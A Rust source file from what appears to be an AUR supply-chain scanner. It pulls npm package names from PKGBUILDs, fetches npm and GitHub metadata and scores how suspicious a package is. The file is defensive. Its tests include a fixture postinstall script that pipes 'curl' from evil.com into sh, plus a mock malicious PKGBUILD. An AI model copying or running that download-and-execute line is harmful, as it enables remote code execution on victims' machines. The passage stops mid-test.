//! NPM package legitimacy verification.
//!
//! # Pipeline
//!
//! 1. **Detection** — regex match in PKGBUILD for npm/yarn/npx commands or
//!    `registry.npmjs.org` tarball URLs (see `extract_npm_package_name`).
//! 2. **Fetch** — query `registry.npmjs.org/<pkg>` for scripts, maintainers,
//!    repo URL, creation time.
//! 3. **Deep-inspect** — if a GitHub repo is linked, fetch stars, forks,
//!    README size, and closed-issues count.
//! 4. **Score** — all fields feed into `scoring::npm_suspicion_risk()`, which
//!    computes the four-component NPM Suspicion Score with the formula:
//!
//!    S_npm = min(Rmax, Σ Wi·fi(x) + Ω)
//!
//!    See `scoring.rs` for the mathematics.

use crate::shared::models::{NpmPackageInfo, NpmScripts};
use regex::Regex;
use serde::Deserialize;
use std::sync::LazyLock;

/// Match any registry.npmjs.org URL and extract package name.
/// Captures both normal names (pkg) and scoped names (@scope/pkg).
static NPM_PKG_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"registry\.npmjs\.org/(@?[\w.-]+(?:/[@\w][\w.-]*)?)"#).unwrap()
});

/// Match npm/yarn/bun install/add commands with a specific package.
///
/// Uses `[ \t]+` (NOT `\s+`) to prevent matching across newlines — `\s`
/// matches `\n` in Rust's regex crate, which would greedily consume line
/// breaks and capture words from the next line as a false package name.
static NPM_INSTALL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(npm|yarn|bun)\s+(install|add)[ \t]+(-g[ \t]+)?['"]?(@?[\w@./-]+)"#).unwrap()
});

/// Match `npx <package>` commands and extract the package name.
///
/// Examples: `npx electron-builder build ...` → captures `electron-builder`.
/// Flags between npx and the package (e.g. `npx --yes foo`) are handled
/// by matching the first non-flag word token.
static NPX_EXEC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"npx[ \t]+(?:--?[^\s]+[ \t]+)*['"]?([@\w][\w@./-]*)"#).unwrap()
});

/// GitHub repo URL extractor (reused logic from github.rs).
static GITHUB_URL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)github\.com/([^/\s]+)/([^/\s#?.]+)"#).unwrap()
});

// ────────────────────────────────────────────
// Deserialization structs for NPM registry API
// ────────────────────────────────────────────

#[derive(Deserialize)]
struct NpmRegistryPackage {
    #[serde(default)]
    scripts: Option<NpmScripts>,
    #[serde(default)]
    maintainers: Vec<NpmMaintainer>,
    #[serde(default)]
    repository: Option<NpmRepository>,
    time: Option<NpmTime>,
}

#[derive(Deserialize)]
struct NpmMaintainer {
    #[allow(dead_code)]
    name: String,
}

/// Handles npm's inconsistent repository field (string or object).
#[derive(Deserialize)]
#[serde(untagged)]
enum NpmRepository {
    String(String),
    Object {
        #[serde(default)]
        url: Option<String>,
    },
}

impl NpmRepository {
    fn url(&self) -> Option<&str> {
        match self {
            NpmRepository::String(s) => Some(s.as_str()),
            NpmRepository::Object { url } => url.as_deref(),
        }
    }
}

#[derive(Deserialize)]
struct NpmTime {
    created: Option<String>,
}

// ──────────────────────────────────────────────────────────
// Public entry point: fetch_npm_info
// ──────────────────────────────────────────────────────────

/// Fetch NPM package metadata if the PKGBUILD references an npm package.
///
/// Extracts package name from npm registry URLs or npm install commands,
/// then queries the npm registry for scripts/maintainers/repo, and finally
/// deep-inspects the linked GitHub repo (if any) for stars, forks, README
/// size, and closed-issues count.
pub fn fetch_npm_info(pkgbuild_content: &str) -> Option<NpmPackageInfo> {
    let package_name = extract_npm_package_name(pkgbuild_content)?;
    let registry_data = fetch_registry_data(&package_name)?;

    // Extract all fields before constructing to avoid partial moves
    let maintainer_count = registry_data.maintainers.len() as u32;
    let account_age = compute_account_age(&registry_data);
    let repo_url = registry_data
        .repository
        .as_ref()
        .and_then(|r| r.url())
        .map(|s| s.to_string());
    let scripts = registry_data.scripts.unwrap_or_default();

    let mut info = NpmPackageInfo {
        package_name: package_name.clone(),
        scripts,
        maintainer_account_age: account_age,
        maintainer_package_count: maintainer_count,
        github_repo_exists: false,
        github_stars: 0,
        github_commit_freshness: 365, // conservative default
        github_forks: 0,
        github_closed_issues: 0,
        github_readme_bytes: 0,
        repo_spoofed: false,
    };

    // If npm package has a GitHub repo, fetch deep-inspection stats
    if let Some(ref repo_url) = repo_url {
        if let Some((owner, repo)) = parse_github_url(repo_url) {
            let clean_repo = repo.trim_end_matches(".git");

            // Fetch repo overview (stars, forks, last push)
            if let Some(gh) = fetch_github_stats(&owner, clean_repo) {
                info.github_repo_exists = gh.found;
                info.github_stars = gh.stars;
                info.github_commit_freshness = gh.days_since_last_commit;
                info.github_forks = gh.forks;
            }

            // Fetch README size (independent of repo overview)
            info.github_readme_bytes =
                fetch_github_readme_size(&owner, clean_repo).unwrap_or(0);

            // Fetch closed issues count (best-effort; search API may rate-limit)
            info.github_closed_issues =
                fetch_github_closed_issues(&owner, clean_repo).unwrap_or(0);

            // Repo spoofing check: does the GitHub repo's root package.json
            // `name` field plausibly correspond to the npm package name?
            // Monorepos (e.g. electron-builder → @electron-builder/monorepo)
            // are common and should not be flagged.
            if let Some(gh_pkg_name) =
                fetch_github_package_json_name(&owner, clean_repo)
            {
                if !npm_name_matches_repo_name(&package_name, &gh_pkg_name) {
                    info.repo_spoofed = true;
                }
            } else {
                // No package.json at all in the repo root → can't verify
                info.repo_spoofed = true;
            }
        }
    }

    Some(info)
}

// ──────────────────────────────────────────────────────────
// Package name extraction from PKGBUILD
// ──────────────────────────────────────────────────────────

/// Extract npm package name from PKGBUILD content.
fn extract_npm_package_name(content: &str) -> Option<String> {
    // Try npm registry tarball URL first (most reliable)
    if let Some(caps) = NPM_PKG_NAME_RE.captures(content) {
        let pkg = caps[1].to_string();
        // Skip if it's just a path segment like "/-/" 
        if !pkg.is_empty() && pkg != "-" && !pkg.starts_with('-') {
            return Some(pkg);
        }
    }

    // Try npm/yarn install commands
    if let Some(caps) = NPM_INSTALL_RE.captures(content) {
        let pkg = caps[4].to_string();
        // Strip version: @scope/name@version -> @scope/name
        if let Some(at_pos) = pkg.rfind('@') {
            if at_pos > 0 {
                let name = &pkg[..at_pos];
                if !name.is_empty() {
                    return Some(name.to_string());
                }
            }
        }
        if !pkg.is_empty() {
            return Some(pkg);
        }
    }

    // Try npx <package> commands (e.g. `npx electron-builder build ...`)
    if let Some(caps) = NPX_EXEC_RE.captures(content) {
        let pkg = caps[1].to_string();
        // Filter out common shell keywords that can appear after bare `npm install`
        // with newline-matching (legacy safety, though [ \t]+ now prevents this)
        if !is_shell_keyword(&pkg) && !pkg.is_empty() {
            return Some(pkg);
        }
    }

    None
}

/// Returns true if the word looks like a shell keyword or common false positive
/// (safety net for regex edge cases).
fn is_shell_keyword(word: &str) -> bool {
    matches!(
        word,
        "if" | "then" | "else" | "elif" | "fi" | "do" | "done"
            | "for" | "while" | "in" | "case" | "esac" | "function"
    )
}

// ──────────────────────────────────────────────────────────
// NPM registry API
// ──────────────────────────────────────────────────────────

/// Fetch package metadata from npm registry.
fn fetch_registry_data(package_name: &str) -> Option<NpmRegistryPackage> {
    let url = format!("https://registry.npmjs.org/{package_name}");

    let client = reqwest::blocking::Client::new();
    let resp = client
        .get(&url)
        .header("User-Agent", "traur")
        .header("Accept", "application/json")
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if !resp.status().is_success() {
        return None;
    }

    resp.json().ok()
}

// ──────────────────────────────────────────────────────────
// GitHub API: repo overview (stars, forks, last push)
// ──────────────────────────────────────────────────────────

/// Aggregated GitHub stats for an npm package's linked repository.
struct GitHubNpmStats {
    stars: u32,
    forks: u32,
    found: bool,
    days_since_last_commit: u32,
}

/// Fetch repo overview from GitHub API.
fn fetch_github_stats(owner: &str, repo: &str) -> Option<GitHubNpmStats> {
    let api_url = format!("https://api.github.com/repos/{owner}/{repo}");

    let client = reqwest::blocking::Client::new();
    let mut request = client
        .get(&api_url)
        .header("User-Agent", "traur")
        .header("Accept", "application/vnd.github.v3+json");

    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.header("Authorization", format!("Bearer {token}"));
        }
    }

    let resp = request
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if resp.status() == 404 {
        return Some(GitHubNpmStats {
            stars: 0,
            forks: 0,
            found: false,
            days_since_last_commit: 365,
        });
    }

    if !resp.status().is_success() {
        return None;
    }

    #[derive(Deserialize)]
    struct GhResponse {
        stargazers_count: u32,
        forks_count: u32,
        pushed_at: Option<String>,
    }

    let gh: GhResponse = resp.json().ok()?;

    let days_since = gh
        .pushed_at
        .as_deref()
        .and_then(|s| chrono_like_parse(s).ok())
        .map(|ts| {
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64;
            (now.saturating_sub(ts) / 86400) as u32
        })
        .unwrap_or(365);

    Some(GitHubNpmStats {
        stars: gh.stargazers_count,
        forks: gh.forks_count,
        found: true,
        days_since_last_commit: days_since,
    })
}

// ──────────────────────────────────────────────────────────
// GitHub API: closed issues count (for f_bot interactions)
// ──────────────────────────────────────────────────────────

/// Fetch closed issues count via GitHub search API.
///
/// Uses `GET /search/issues?q=repo:owner/repo+type:issue+state:closed&per_page=1`
/// to get just the `total_count` without fetching actual issue bodies.
/// Returns `None` on failure (network, rate-limit, etc.) — callers treat
/// this as zero.
fn fetch_github_closed_issues(owner: &str, repo: &str) -> Option<u32> {
    let query = format!("repo:{owner}/{repo}+type:issue+state:closed");
    let url = format!("https://api.github.com/search/issues?q={query}&per_page=1");

    let client = reqwest::blocking::Client::new();
    let mut request = client
        .get(&url)
        .header("User-Agent", "traur")
        .header("Accept", "application/vnd.github.v3+json");

    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.header("Authorization", format!("Bearer {token}"));
        }
    }

    let resp = request
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if !resp.status().is_success() {
        return None;
    }

    #[derive(Deserialize)]
    struct SearchResponse {
        total_count: u32,
    }

    let result: SearchResponse = resp.json().ok()?;
    Some(result.total_count)
}

// ──────────────────────────────────────────────────────────
// GitHub API: README size (for f_doc documentation risk)
// ──────────────────────────────────────────────────────────

/// Fetch README size in bytes from GitHub.
///
/// Calls `GET /repos/owner/repo/readme` which returns JSON with a `size`
/// field (bytes). Returns `None` on failure (e.g., no README, private repo).
fn fetch_github_readme_size(owner: &str, repo: &str) -> Option<u32> {
    let url = format!("https://api.github.com/repos/{owner}/{repo}/readme");

    let client = reqwest::blocking::Client::new();
    let mut request = client
        .get(&url)
        .header("User-Agent", "traur")
        .header("Accept", "application/vnd.github.v3+json");

    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.header("Authorization", format!("Bearer {token}"));
        }
    }

    let resp = request
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if !resp.status().is_success() {
        return None;
    }

    #[derive(Deserialize)]
    struct ReadmeResponse {
        size: u32,
    }

    let result: ReadmeResponse = resp.json().ok()?;
    Some(result.size)
}

// ──────────────────────────────────────────────────────────
// GitHub API: package.json name (for repo spoofing detection)
// ──────────────────────────────────────────────────────────

/// Fetch the repo's root `package.json` from GitHub and extract its `name`
/// field. Returns `None` if the repo has no `package.json` at all.
///
/// Uses `GET /repos/owner/repo/contents/package.json` and Base64-decodes
/// the content.
fn fetch_github_package_json_name(owner: &str, repo: &str) -> Option<String> {
    let url = format!(
        "https://api.github.com/repos/{owner}/{repo}/contents/package.json"
    );

    let client = reqwest::blocking::Client::new();
    let mut request = client
        .get(&url)
        .header("User-Agent", "traur")
        .header("Accept", "application/vnd.github.v3+json");

    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.header("Authorization", format!("Bearer {token}"));
        }
    }

    let resp = request
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if !resp.status().is_success() {
        return None;
    }

    #[derive(Deserialize)]
    struct ContentResponse {
        content: String,
    }

    let content_resp: ContentResponse = resp.json().ok()?;

    // Decode Base64 (GitHub Content API returns base64-encoded)
    let decoded = base64_decode(&content_resp.content)?;

    // Parse just the "name" field from JSON
    extract_json_name_field(&decoded)
}

/// Minimal JSON `"name"` extraction — avoids pulling in a full JSON parser
/// for a single field lookup.
fn extract_json_name_field(json_bytes: &[u8]) -> Option<String> {
    let text = std::str::from_utf8(json_bytes).ok()?;
    // Match `"name"` followed by `:` and a quoted string
    let re = regex::Regex::new(r#""name"\s*:\s*"([^"]+)""#).unwrap();
    re.captures(text)
        .map(|caps| caps[1].to_string())
}

/// Check whether an npm package name plausibly matches the `name` field
/// from a GitHub repo's root `package.json`.
///
/// This is intentionally loose to avoid false-flagging monorepos, scoped
/// packages, and renamed repos.  Rules (short-circuit on first match):
///
/// 1. Exact case-insensitive match.  Ex: `minimist` = `minimist`
///
/// 2. If npm name is unscoped and repo name is scoped (`@x/y`), check if
///    the scope part equals the npm name.
///    Ex: `electron-builder` matches `@electron-builder/monorepo`
///
/// 3. Substring fallback (after stripping scope prefixes).
///
/// 4. Same word-bag: all hyphen-delimited words of the npm name appear in
///    the repo name.
fn npm_name_matches_repo_name(npm_name: &str, repo_name: &str) -> bool {
    let n = npm_name.to_lowercase();
    let r = repo_name.to_lowercase();

    if n == r {
        return true;
    }

    // Helper: split on hyphens, dots, slashes
    fn words(s: &str) -> Vec<String> {
        s.split(&['-', '.', '/'])
            .map(|w| w.to_string())
            .filter(|w| !w.is_empty())
            .collect()
    }

    // npm unscoped, repo scoped: check scope part and unscope remainder
    if !n.starts_with('@') && r.starts_with('@') {
        if let Some(slash) = r.find('/') {
            let scope = &r[1..slash];
            if n == scope {
                return true;
            }
            let rest = &r[slash + 1..];
            if n.len() >= 5 && rest.contains(&n) {
                return true;
            }
            let nw = words(&n);
            let rw = words(rest);
            if !nw.is_empty() && nw.iter().all(|w| rw.contains(w)) {
                return true;
            }
        }
    }

    // Both scoped: compare unscope parts
    if n.starts_with('@') && r.starts_with('@') {
        if let (Some(nu), Some(ru)) = (n.split('/').nth(1), r.split('/').nth(1)) {
            if nu == ru {
                return true;
            }
            if nu.len() > 3 && (ru.contains(nu) || nu.contains(ru)) {
                return true;
            }
        }
    }

    // Substring fallback
    if (n.len() >= 5 && r.contains(&n)) || (r.len() >= 5 && n.contains(&r)) {
        return true;
    }

    // Word-bag match
    let nw = words(&n);
    let rw = words(&r);
    if !nw.is_empty() && nw.iter().all(|w| rw.contains(w)) {
        return true;
    }

    false
}

/// Decode a Base64 string (GitHub Content API format, may contain newlines).
fn base64_decode(input: &str) -> Option<Vec<u8>> {
    // Minimal Base64 decoder — no external dependency needed.
    const CHARS: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let cleaned: String = input.chars().filter(|c| !c.is_whitespace()).collect();
    let bytes = cleaned.as_bytes();
    if bytes.is_empty() {
        return Some(vec![]);
    }
    // Build a reverse lookup map
    let mut lookup = [255u8; 128];
    for (i, &c) in CHARS.iter().enumerate() {
        lookup[c as usize] = i as u8;
    }
    lookup[b'=' as usize] = 0; // padding is treated as 0

    let mut out = Vec::with_capacity(bytes.len() * 3 / 4);
    for chunk in bytes.chunks(4) {
        let a = *lookup.get(chunk.first().copied().unwrap_or(0) as usize).unwrap_or(&255);
        let b = *lookup.get(chunk.get(1).copied().unwrap_or(0) as usize).unwrap_or(&255);
        let c = *lookup.get(chunk.get(2).copied().unwrap_or(0) as usize).unwrap_or(&255);
        let d = *lookup.get(chunk.get(3).copied().unwrap_or(0) as usize).unwrap_or(&255);
        if a == 255 || b == 255 {
            return None;
        }
        out.push((a << 2) | (b >> 4));
        if chunk.get(2).map_or(false, |&ch| ch != b'=') {
            if c == 255 {
                return None;
            }
            out.push((b << 4) | (c >> 2));
            if chunk.get(3).map_or(false, |&ch| ch != b'=') {
                if d == 255 {
                    return None;
                }
                out.push((c << 6) | d);
            }
        }
    }
    Some(out)
}

// ──────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────

/// Compute maintainer account age from package creation time.
fn compute_account_age(data: &NpmRegistryPackage) -> u32 {
    let created_str = data
        .time
        .as_ref()
        .and_then(|t| t.created.as_deref())
        .unwrap_or("");

    // Parse ISO 8601: "2024-01-15T10:30:00.000Z"
    if let Ok(created) = chrono_like_parse(created_str) {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;
        let age_secs = now.saturating_sub(created);
        (age_secs / 86400) as u32
    } else {
        0
    }
}

/// Simple ISO 8601 parser (avoids adding chrono dependency).
fn chrono_like_parse(s: &str) -> Result<i64, ()> {
    // Format: "2024-01-15T10:30:00.000Z" or "2024-01-15T10:30:00Z"
    let s = s.trim();
    if s.len() < 19 {
        return Err(());
    }
    let year: i32 = s[0..4].parse().map_err(|_| ())?;
    let month: u32 = s[5..7].parse().map_err(|_| ())?;
    let day: u32 = s[8..10].parse().map_err(|_| ())?;
    let hour: u32 = s[11..13].parse().map_err(|_| ())?;
    let min: u32 = s[14..16].parse().map_err(|_| ())?;
    let sec: u32 = s[17..19].parse().map_err(|_| ())?;

    // Simple days-from-epoch calculation
    let days = days_from_civil(year, month, day);
    Ok(days as i64 * 86400 + hour as i64 * 3600 + min as i64 * 60 + sec as i64)
}

/// Days from Unix epoch for a civil date.
fn days_from_civil(y: i32, m: u32, d: u32) -> i32 {
    let y = y as i32;
    let m = m as i32;
    let d = d as i32;
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y / 400 } else { (y - 399) / 400 };
    let yoe = y - era * 400;
    let doy = if m > 2 {
        (153 * (m - 3) + 2) / 5 + d - 1
    } else {
        (153 * (m + 9) + 2) / 5 + d - 1
    };
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146097 + doe - 719468
}

/// Parse GitHub URL to owner/repo.
fn parse_github_url(url: &str) -> Option<(String, String)> {
    let caps = GITHUB_URL_RE.captures(url)?;
    Some((caps[1].to_string(), caps[2].to_string()))
}

// ──────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // --- package name extraction ---

    #[test]
    fn extracts_package_from_registry_url() {
        let content = r#"source=("https://registry.npmjs.org/atomic-lockfile/-/atomic-lockfile-1.0.0.tgz")"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("atomic-lockfile")
        );
    }

    #[test]
    fn extracts_scoped_package() {
        let content = r#"source=("https://registry.npmjs.org/@scope/pkg/-/@scope/pkg-1.0.0.tgz")"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("@scope/pkg")
        );
    }

    #[test]
    fn extracts_from_install_command() {
        let content = r#"npm install -g malicious-pkg@1.2.3"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("malicious-pkg")
        );
    }

    #[test]
    fn extracts_from_bun_install() {
        let content = "bun add typescript@5.3";
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("typescript")
        );
    }

    #[test]
    fn extracts_from_bun_install_global() {
        let content = "bun install -g turbo";
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("turbo")
        );
    }

    #[test]
    fn no_npm_returns_none() {
        let content = "pacman -S something";
        assert!(extract_npm_package_name(content).is_none());
    }

    #[test]
    fn bare_npm_install_no_package_name() {
        // `npm install` without a package name installs from package.json;
        // there is no specific npm package to check.
        let content = "npm_config_cache=\"${srcdir}/cache\" npm install";
        assert!(
            extract_npm_package_name(content).is_none(),
            "Bare `npm install` with no package name should return None"
        );
    }

    #[test]
    fn bare_npm_install_alone_no_npx_returns_none() {
        // When only `npm install` exists (no npx, no registry URL),
        // the function should return None.
        let content = r#"
build() {
  cd "${srcdir}/${pkgname}-${pkgver}"
  npm install
  npm run build
}
"#;
        assert!(
            extract_npm_package_name(content).is_none(),
            "`npm install` + `npm run` without npx or registry URL should return None"
        );
    }

    #[test]
    fn bare_npm_install_no_crossline_match() {
        // The regex must NOT cross newlines and capture `if` from the next line.
        // It SHOULD find the `npx electron-builder` on a later line.
        let content = r#"npm install
  if [[ ${CARCH} == "aarch64" ]]; then
    npx electron-builder build --arm64 --linux dir
  fi"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("electron-builder"),
            "Should find npx package on later line, not `if` from cross-line match"
        );
    }

    #[test]
    fn extracts_from_npx_command() {
        let content = "npx electron-builder build --arm64 --linux dir";
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("electron-builder"),
            "npx <pkg> should extract the package name"
        );
    }

    #[test]
    fn extracts_from_npx_with_flags() {
        let content = "npx --yes --package typescript tsc --version";
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("typescript"),
            "npx with flags should skip flags and capture the package name"
        );
    }

    #[test]
    fn npx_shell_keywords_ignored() {
        // Safety net: even if a regex bug matches `npx if`, shell keywords
        // are filtered out by is_shell_keyword().
        assert!(is_shell_keyword("if"));
        assert!(is_shell_keyword("then"));
        assert!(!is_shell_keyword("electron-builder"));
    }

    /// Real-world test: teams-for-linux PKGBUILD uses `npm install` (bare, no
    /// package name) and `npx electron-builder`. The bare `npm install` must
    /// NOT cross the newline and capture `if` as a package name.
    #[test]
    fn teams_for_linux_npm_extraction() {
        let content = r#"
build() {
  cd "${srcdir}/${pkgname}-${pkgver}"
  npm_config_cache="${srcdir}/package-cache" npm install
  if [[ ${CARCH} == "aarch64" ]]; then
    npx electron-builder build --arm64 --linux dir
  elif [[ ${CARCH} == "armv7h" ]]; then
    npx electron-builder build --armv7l --linux dir
  elif [[ ${CARCH} == "i686" ]]; then
    npx electron-builder build --ia32 --linux dir
  elif [[ ${CARCH} == "x86_64" ]]; then
    npx electron-builder build --x64 --linux dir
  fi
}
"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("electron-builder"),
            "Should extract package from npx, not match `if` across newline from bare npm install"
        );
    }

    #[test]
    fn iso_parse() {
        let ts = chrono_like_parse("2024-01-15T10:30:00Z").unwrap();
        // Jan 15, 2024 = day 738900 from epoch approximately
        assert!(ts > 1700000000);
        assert!(ts < 1710000000);
    }

    /// Simulate a PKGBUILD that downloads an NPM package containing a suspicious
    /// postinstall script. Verify extract_npm_package_name finds the registry URL.
    #[test]
    fn extracts_from_realistic_malicious_pkgbuild() {
        let content = r#"pkgname=malware-wrapper
pkgver=1.0
pkgrel=1
pkgdesc="Totally legit package"
arch=('x86_64')
depends=('npm')
source=("https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz")
sha256sums=('SKIP')

package() {
    cd "${srcdir}"
    npm install -g evil-pkg@1.0.0
}
"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("evil-pkg"),
            "Should extract package name from registry.npmjs.org source URL"
        );
    }

    // --- npm_suspicion_risk (in scoring.rs) smoke tests via npm_info ---

    /// Obfuscated `node -e` postinstall script in a package from a burner
    /// account: should max out the NPM suspicion score.
    #[test]
    fn suspicious_postinstall_node_eval() {
        let info = test_npm_info_builder()
            .postinstall("node -e \"require('child_process').exec('curl -s http://evil.com/x|sh')\"")
            .account_age(15)
            .package_count(1)
            .no_repo()
            .build();
        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
        // Omega (critical payload) = 30 → S_npm = min(30, Σ Wi·fi + 30) = 30
        assert_eq!(
            risk, 30,
            "Critical payload (node -e subshell exec) should max out at 30"
        );
    }

    /// Legitimate NPM package with no scripts, established maintainer, and
    /// a well-maintained GitHub repo.
    #[test]
    fn npm_suspicion_clean_package_zero() {
        let info = test_npm_info_builder()
            .install("node-gyp rebuild")
            .account_age(365)
            .package_count(5)
            .stars(100)
            .forks(20)
            .closed_issues(50)
            .readme_bytes(2000)
            .commit_freshness(10)
            .build();
        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
        // No suspicious scripts (Ω=0), high interactions, old account, README exists → near zero
        assert!(risk < 5, "Clean npm package should have risk < 5, got {risk}");
    }

    /// No README, no stars, no interactions, burner account: botting + doc risk.
    #[test]
    fn npm_suspicion_burner_package() {
        let info = test_npm_info_builder()
            .account_age(5)
            .package_count(1)
            .no_repo()
            .build();
        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
        // Ω=0 (no scripts), but f_bot≈1, f_doc=1, f_auth≈0.89
        // 15*1 + 5*1 + 10*0.89 ≈ 28.9
        assert!(
            risk > 20,
            "Burner package with no README should have risk > 20, got {risk}"
        );
        assert!(
            risk <= 30,
            "Risk should be capped at 30, got {risk}"
        );
    }

    /// Repo spoofing: npm package claims a GitHub repo but the repo's
    /// package.json `name` doesn't match → Ω = Rmax = 30.
    #[test]
    fn npm_suspicion_repo_spoofed_maxes_out() {
        let info = test_npm_info_builder()
            .account_age(365)
            .package_count(20)
            .stars(5000)
            .forks(200)
            .closed_issues(500)
            .readme_bytes(5000)
            .spoofed()
            .build();
        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
        // Everything else looks pristine, but repo_spoofed → Ω=30 → S_npm=30
        assert_eq!(
            risk, 30,
            "Repo spoofing should max out risk at 30 regardless of other signals, got {risk}"
        );
    }

    // --- base64_decode tests ---

    #[test]
    fn base64_decode_hello_world() {
        let result = base64_decode("SGVsbG8gV29ybGQ=");
        assert_eq!(result.as_deref(), Some(b"Hello World".as_slice()));
    }

    #[test]
    fn base64_decode_with_whitespace() {
        let result = base64_decode("SGVs bG8g\nV29y bGQ=");
        assert_eq!(result.as_deref(), Some(b"Hello World".as_slice()));
    }

    #[test]
    fn base64_decode_package_json_name() {
        // Simulates: {"name": "electron-builder", "version": "1.0.0"}
        let encoded = "eyJuYW1lIjogImVsZWN0cm9uLWJ1aWxkZXIiLCAidmVyc2lvbiI6ICIxLjAuMCJ9";
        let decoded = base64_decode(encoded).unwrap();
        let name = extract_json_name_field(&decoded);
        assert_eq!(name.as_deref(), Some("electron-builder"));
    }

    #[test]
    fn extract_json_name_field_basic() {
        let json = br#"{"name": "minimist", "version": "1.0.0"}"#;
        assert_eq!(
            extract_json_name_field(json).as_deref(),
            Some("minimist")
        );
    }

    #[test]
    fn extract_json_name_field_scoped() {
        let json = br#"{"name": "@scope/pkg", "version": "1.0.0"}"#;
        assert_eq!(
            extract_json_name_field(json).as_deref(),
            Some("@scope/pkg")
        );
    }

    // --- npm_name_matches_repo_name tests ---

    #[test]
    fn name_match_exact() {
        assert!(npm_name_matches_repo_name("minimist", "minimist"));
        assert!(npm_name_matches_repo_name("Electron-Builder", "electron-builder"));
    }

    #[test]
    fn name_match_monorepo_scope_equals_npm_name() {
        // electron-builder → @electron-builder/monorepo
        assert!(
            npm_name_matches_repo_name("electron-builder", "@electron-builder/monorepo"),
            "Scope part equals npm name"
        );
    }

    #[test]
    fn name_match_unscoped_in_scoped_rest() {
        // npm "core-js" in "@core-js/monorepo" — scope equals npm name
        assert!(
            npm_name_matches_repo_name("core-js", "@core-js/monorepo"),
            "npm name equals scope part of scoped repo name"
        );
        // npm "babel" in "@babel/monorepo" — npm name equals scope
        assert!(
            npm_name_matches_repo_name("babel", "@babel/monorepo"),
            "unhyphenated npm name equals scope"
        );
    }

    #[test]
    fn name_match_both_scoped() {
        assert!(npm_name_matches_repo_name("@scope/pkg", "@scope/pkg"));
    }

    #[test]
    fn name_match_substring() {
        assert!(npm_name_matches_repo_name("foo-lgpl", "foo-lgpl-core"));
    }

    #[test]
    fn name_mismatch_completely_different() {
        assert!(!npm_name_matches_repo_name("electron-builder", "express"));
        assert!(!npm_name_matches_repo_name("minimist", "lodash"));
        assert!(!npm_name_matches_repo_name("react", "@vue/core"));
    }

    // --- integration tests (network) ---

    /// Integration test: fetch real `atomic-lockfile` from npm registry.
    /// This was the payload package in the 2026-06-12 AUR attack wave.
    /// Marked #[ignore] since it requires network access.
    #[test]
    #[ignore]
    fn fetch_real_atomic_lockfile() {
        let content = r#"source=("https://registry.npmjs.org/atomic-lockfile/-/atomic-lockfile-1.0.0.tgz")"#;
        let info = fetch_npm_info(content);
        assert!(info.is_some(), "Should return Some for real npm package atomic-lockfile");

        let info = info.unwrap();
        eprintln!("atomic-lockfile npm info:");
        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
        eprintln!("  github_stars: {}", info.github_stars);
        eprintln!("  github_forks: {}", info.github_forks);
        eprintln!("  github_closed_issues: {}", info.github_closed_issues);
        eprintln!("  github_readme_bytes: {}", info.github_readme_bytes);
        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
        eprintln!("  scripts.install: {:?}", info.scripts.install);
        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);

        assert!(info.maintainer_account_age <= 1, "Very recent package should have age <= 1 day");
        assert_eq!(info.maintainer_package_count, 0, "atomic-lockfile has no listed maintainers");
        assert!(!info.github_repo_exists, "Repository is a placeholder string, not a real GitHub repo");

        let all_scripts = format!(
            "{} {} {}",
            info.scripts.preinstall, info.scripts.install, info.scripts.postinstall
        );
        assert!(all_scripts.trim().is_empty(), "atomic-lockfile has no scripts");
        eprintln!("  combined scripts: '{}'", all_scripts);
    }

    /// Integration test: fetch a well-known benign npm package (minimist).
    /// Marked #[ignore] since it requires network access.
    #[test]
    #[ignore]
    fn fetch_real_minimist() {
        let content = r#"source=("https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz")"#;
        let info = fetch_npm_info(content);
        assert!(info.is_some(), "Should return Some for real npm package minimist");

        let info = info.unwrap();
        eprintln!("minimist npm info:");
        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
